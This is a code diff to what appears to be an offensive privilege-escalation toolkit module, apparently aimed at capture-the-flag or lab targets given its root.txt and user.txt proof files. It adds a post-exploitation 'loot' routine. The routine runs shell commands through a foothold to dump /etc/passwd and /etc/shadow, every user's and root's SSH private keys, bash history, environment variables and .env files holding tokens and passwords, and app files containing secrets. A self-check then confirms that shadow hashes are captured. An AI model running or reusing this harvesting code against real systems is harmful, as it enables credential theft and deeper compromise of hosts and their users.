@@ -34,10 +34,33 @@ ENUM = {
 
 _GTFO_CACHE = Path(".metsec_cache/gtfobins.json")
 
+# Post-exploitation looting — credentials, keys, and proof files. Run as the
+# current foothold user (run again after escalating to root for root-only files).
+LOOT = {
+    "passwd": "cat /etc/passwd 2>/dev/null | head -40",
+    "shadow": "cat /etc/shadow 2>/dev/null",
+    "ssh_keys": "cat ~/.ssh/id_* /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null",
+    "history": "tail -n 40 ~/.bash_history 2>/dev/null",
+    "env_secrets": "env 2>/dev/null | grep -iE 'key|token|secret|pass|aws'",
+    "dotenv": "cat /app/.env /var/www/.env ~/.env 2>/dev/null",
+    "app_secrets": "grep -rIlE 'password|secret|api[_-]?key|token' /app /var/www 2>/dev/null | head -20",
+    "proof": "cat /root/root.txt /root/proof.txt /home/*/user.txt ~/user.txt 2>/dev/null",
+}
+
 
 def enumerate_host(run) -> dict:
     """run: a callable(command)->output (the exec channel). Returns a host profile."""
     return {k: run(cmd) for k, cmd in ENUM.items()}
+
+
+def loot(run) -> dict:
+    """Capture readable secrets/keys/proof via the foothold. Empty results dropped."""
+    out = {}
+    for k, cmd in LOOT.items():
+        r = (run(cmd) or "").strip()
+        if r and "command not found" not in r:
+            out[k] = r[:1200]
+    return out
 
 
 def _gtfo_map(data: dict) -> dict:
@@ -119,4 +142,7 @@ if __name__ == "__main__":  # offline self-check: python -m metsec.privesc
     assert ("find", "sudo") in vectors and ("vim", "sudo") in vectors, vectors
     assert ("find", "suid") in vectors and ("passwd", "suid") not in vectors, vectors
     assert next(c for c in cands if c["vector"] == "sudo")["run"].startswith("sudo ")
+
+    captured = loot(lambda c: "root:$6$hash:::" if "shadow" in c else "")
+    assert list(captured) == ["shadow"] and captured["shadow"].startswith("root:"), captured
     print("privesc self-check ok")
